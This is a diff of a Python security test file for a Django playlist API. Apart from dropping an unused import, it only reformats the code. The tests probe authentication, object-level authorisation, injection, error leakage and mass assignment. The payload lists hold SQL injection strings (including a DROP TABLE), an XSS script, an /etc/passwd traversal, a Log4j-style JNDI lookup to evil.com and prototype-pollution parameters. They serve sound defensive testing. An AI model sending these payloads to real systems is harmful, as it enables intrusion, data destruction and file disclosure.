@@ -9,8 +9,8 @@ Attack vectors:
 - Unicode abuse
 """
 
-import json
 import pytest
+
 from model_bakery import baker
 
 from api.schedule.models import Playlist
@@ -24,7 +24,10 @@ class TestPlaylistListAuthentication:
     def test_list_without_auth(self, api_client):
         """Anonymous LIST should fail."""
         response = api_client.get("/api/v2/playlists")
-        assert response.status_code in [401, 403], "Anonymous can list playlists"
+        assert response.status_code in [
+            401,
+            403,
+        ], "Anonymous can list playlists"
 
 
 @pytest.mark.django_db(transaction=True)
@@ -32,10 +35,16 @@ class TestPlaylistListBOLA:
     """LIST BOLA tests."""
 
     @pytest.mark.xfail(reason="T412: No owner filtering on Playlist")
-    def test_list_shows_only_own_playlists(self, api_client, admin_user, regular_user):
+    def test_list_shows_only_own_playlists(
+        self, api_client, admin_user, regular_user,
+    ):
         """Verify list returns only user's own playlists."""
-        playlist1 = baker.make(Playlist, name="Admin Playlist", owner=admin_user)
-        playlist2 = baker.make(Playlist, name="User Playlist", owner=regular_user)
+        playlist1 = baker.make(
+            Playlist, name="Admin Playlist", owner=admin_user,
+        )
+        playlist2 = baker.make(
+            Playlist, name="User Playlist", owner=regular_user,
+        )
 
         api_client.force_authenticate(user=regular_user)
         response = api_client.get("/api/v2/playlists")
@@ -43,13 +52,17 @@ class TestPlaylistListBOLA:
         assert response.status_code == 200
         data = response.json()
         playlist_ids = [d["id"] for d in data]
-        
-        assert playlist1.id not in playlist_ids, "List shows other users' playlists (BOLA)"
+
+        assert (
+            playlist1.id not in playlist_ids
+        ), "List shows other users' playlists (BOLA)"
 
     @pytest.mark.xfail(reason="T413: BOLA via owner filter")
     def test_filter_by_other_owner(self, api_client, admin_user, regular_user):
         """Try to filter by another user's owner ID."""
-        playlist = baker.make(Playlist, name="Admin Playlist", owner=admin_user)
+        playlist = baker.make(
+            Playlist, name="Admin Playlist", owner=admin_user,
+        )
 
         api_client.force_authenticate(user=regular_user)
         response = api_client.get(f"/api/v2/playlists?owner={admin_user.id}")
@@ -67,7 +80,7 @@ class TestPlaylistFilterInjection:
         """Try to filter by invalid owner_id."""
         api_client.force_authenticate(user=admin_user)
         response = api_client.get("/api/v2/playlists?owner=invalid")
-        
+
         if response.status_code == 500:
             pytest.fail("BUG: Filter crashes on invalid owner_id")
         assert response.status_code in [200, 400]
@@ -75,13 +88,13 @@ class TestPlaylistFilterInjection:
     def test_filter_by_sql_injection(self, api_client, admin_user):
         """Try SQL injection in owner filter."""
         api_client.force_authenticate(user=admin_user)
-        
+
         sqli_payloads = [
             "1' OR '1'='1",
             "1; DROP TABLE cc_playlist;--",
             "1 UNION SELECT * FROM cc_subjs",
         ]
-        
+
         for payload in sqli_payloads:
             response = api_client.get(f"/api/v2/playlists?owner={payload}")
             if response.status_code == 500:
@@ -91,7 +104,7 @@ class TestPlaylistFilterInjection:
         """Try to filter by negative owner_id."""
         api_client.force_authenticate(user=admin_user)
         response = api_client.get("/api/v2/playlists?owner=-1")
-        
+
         assert response.status_code in [200, 400]
 
 
@@ -103,7 +116,7 @@ class TestPlaylistListInformationDisclosure:
         """Check if error messages leak information."""
         api_client.force_authenticate(user=admin_user)
         response = api_client.get("/api/v2/playlists?owner=invalid")
-        
+
         if response.status_code == 400:
             content = response.content.decode()
             leaked_terms = ["cc_playlist", "column", "sql", "table"]
@@ -119,14 +132,14 @@ class TestPlaylistUnicodeAbuse:
     def test_list_with_unicode_filter(self, api_client, admin_user):
         """Try Unicode in filter parameters."""
         api_client.force_authenticate(user=admin_user)
-        
+
         unicode_values = [
             "\u0000",  # Null byte
             "<script>alert('XSS')</script>",
             "../../../etc/passwd",
             "${jndi:ldap://evil.com}",  # Log4j-style
         ]
-        
+
         for value in unicode_values:
             response = api_client.get(f"/api/v2/playlists?owner={value}")
             if response.status_code == 500:
@@ -140,13 +153,13 @@ class TestPlaylistListMassAssignment:
     def test_get_with_extra_parameters(self, api_client, admin_user):
         """Try GET with extra/malicious parameters."""
         api_client.force_authenticate(user=admin_user)
-        
+
         malicious_params = [
             "?id=99999&admin=true",
             "?__proto__=test",
             "?constructor[type]=admin",
         ]
-        
+
         for params in malicious_params:
             response = api_client.get(f"/api/v2/playlists{params}")
             assert response.status_code in [200, 400]
